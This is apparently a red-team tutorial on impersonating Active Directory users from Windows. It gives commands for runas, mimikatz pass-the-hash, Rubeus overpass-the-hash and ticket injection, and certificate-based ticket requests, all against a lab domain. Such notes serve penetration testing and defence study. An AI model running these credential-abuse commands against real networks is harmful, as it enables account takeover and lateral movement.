# Impersonation in AD

## Connectivity

In order to communicate with AD services and machines, it is required to reach
them. For this purpose we need a foothold in the target network, some options
are:

- Have execution in a machine in the network, maybe through an implant, and
  execute the tools from that machine
- Having connectivity from the internet to the internal network:
  + Access through a (corporative) VPN
  + Proxy via internal network machine, using protocols like SOCKS

## Credentials

In order to authenticate as an user in AD we need some kind of credential, we
have the following options:

- Password
- NT hash
- Kerberos keys
- Kerberos ticket
- Certificate

Here is a schema of how credentials can related to each other and the different
authentication mechanisms:
```
                                                        .---
            .--------> NT hash ------------.----------> | NTLM
            |                              |            '---
            |                              |
            |                              v            .---
 Password --'--> Kerberos keys --> Kerberos ticket ---> | Kerberos
                                           ^            '---
                                           |
                                           |            .---
          Certificate ---------------------'----------> | Schannel (LDAP)
                                                        '---
```


## Impersonation from Windows


### Using password from Windows

In order to run a tool as another user for which we have the password we can use
the `runas` command:
```
runas /netonly /user:duser@hack.lab powershell
```

### Using NT hash (Pass The Hash or OverPass The Hash) from Windows

When we have a NT hash we can perform a Pass The Hash or OverPass The Hash
techniques:
- Pass The Hash (PtH): Use the NT hash to perform NTLM authentication.
- OverPass The Hash (OPtH): Use the NT hash to retrieve an Kerberos ticket.

To perform a PtH over Windows we can use [mimikatz](https://github.com/gentilkiwi/mimikatz) `sekurlsa::pth` command,
that creates a new process and injects the NT hash as credentials for that
process. It is similar to `runas /netonly` but with a NT hash instead of a
password.

A comfortable option is to run powershell and then execute commands as
the targeted user from there: 
```
C:\> .\mimikatz.exe "sekurlsa::pth /domain:hack.lab /user:Administrator /rc4:AC1DBEF8523BAFECE1428E067C1B114F /run:powershell" "exit"
```

Alternatively, we can perform an OverPass The Hash. For this purpose, we can
request a Kerberos TGT with [Rubeus](https://github.com/GhostPack/Rubeus) `asktgt` command and inject it
into the current session with the `/ptt` option:
```
C:\> .\Rubeus.exe asktgt /user:Administrator /domain:hack.lab /rc4:AC1DBEF8523BAFECE1428E067C1B114F /ptt
```

Then we should be able to see our new imported ticket with `klist`:
```
C:\> klist

Current LogonId is 0:0x1b8482

Cached Tickets: (1)

#0>     Client: Administrator @ HACK.LAB
        Server: krbtgt/hack.lab @ HACK.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 11/09/2025 13:17:27 (local)
        End Time:   11/09/2025 23:17:27 (local)
        Renew Time: 11/16/2025 13:17:27 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```


## Using Kerberos ticket from Windows

If we obtain a Kerberos ticket for whatever means, in Windows we can inject such
ticket in our session with [Rubeus](https://github.com/GhostPack/Rubeus) `ptt` command:
```
C:\> .\Rubeus.exe ptt /ticket:duser.krb

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.3


[*] Action: Import Ticket
[+] Ticket successfully imported!
```

Then we should be able to see our new imported ticket with `klist:`
```
C:\> klist

Current LogonId is 0:0x117c69

Cached Tickets: (1)

#0>     Client: duser @ HACK.LAB
        Server: krbtgt/HACK.LAB @ HACK.LAB
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 11/16/2025 18:49:03 (local)
        End Time:   11/17/2025 4:49:03 (local)
        Renew Time: 11/23/2025 18:49:03 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called:
```

Since we need a ticket in kirbi format, in case we have it in ccache, we can
transform it with [cerbero](https://gitlab.com/Zer1t0/cerbero) `convert` command:
```
C:\> .\cerbero.exe convert -i .\duser.ccache -o duser.krb
```


### Using certificate from Windows

We can use the certificate to request a Kerberos TGT with [Rubeus](https://github.com/GhostPack/Rubeus) `asktgt`
and inject the ticket into the current session:
```
C:\> .\Rubeus.exe asktgt /user:duser /certificate:duser.pfx /ptt
```

